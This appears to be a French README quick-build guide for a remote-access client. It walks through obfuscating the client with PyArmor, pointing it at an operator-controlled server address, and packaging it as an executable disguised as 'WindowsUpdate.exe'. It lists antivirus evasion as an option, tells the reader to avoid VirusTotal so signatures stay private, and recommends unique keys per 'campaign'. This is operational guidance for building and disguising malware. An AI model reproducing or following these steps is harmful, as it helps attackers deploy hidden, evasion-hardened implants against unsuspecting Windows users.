# 🚀 Guide Rapide - Build Client

## Installation Rapide

```bash
# Installer les dépendances de build
pip install pyarmor pyinstaller
```

## Build en 1 Commande

### Windows
```cmd
quick_build.bat
```

### Linux/Mac
```bash
chmod +x quick_build.sh
./quick_build.sh
```

### Manuelle
```bash
python build_client.py
```

## Configuration Minimale

Avant le build, modifiez `config.py` :

```python
HOST = "http://VOTRE_IP:5000"  # ⚠️ IMPORTANT
ENCRYPTION_KEY = b"cle_de_32_caracteres_exactement!"
```

## Résultat

✅ Fichier créé : **`dist/WindowsUpdate.exe`**

Taille attendue : 15-25 MB

## Test Rapide

```bash
# Tester localement
.\dist\WindowsUpdate.exe
```

⚠️ **Recommandé** : Testez d'abord dans une VM Windows

## Protection PyArmor

Le code est automatiquement :
- ✅ Obfusqué (bytecode illisible)
- ✅ Protégé dynamiquement (runtime chiffré)  
- ✅ Anti-décompilation activée
- ✅ Optimisé avec JIT

## Déploiement

L'exécutable est **standalone** (autonome) :
- ✅ Aucune dépendance Python requise
- ✅ Fonctionne directement sur Windows
- ✅ Pas d'installation nécessaire

## Options Avancées

Consultez [BUILD_README.md](BUILD_README.md) pour :
- Personnalisation de l'icône
- Signature de code
- Métadonnées Windows
- Contournement antivirus
- Build optimisé

## Dépannage Rapide

### Erreur: "PyArmor not found"
```bash
pip install --upgrade pyarmor
```

### Erreur: "PyInstaller failed"  
```bash
pip install --upgrade pyinstaller setuptools
```

### L'exe ne démarre pas
1. Vérifier config.py
2. Tester en mode console (modifier build_client.py: `console=True`)
3. Vérifier les logs Windows Event Viewer

## Sécurité

⚠️ **NE JAMAIS** :
- Uploader sur VirusTotal (rend les signatures publiques)
- Stocker sur des services cloud non chiffrés
- Utiliser sans autorisation

✅ **TOUJOURS** :
- Tester dans un environnement isolé
- Chiffrer les backups
- Utiliser des clés uniques par campagne

---

Pour plus de détails : [BUILD_README.md](BUILD_README.md)
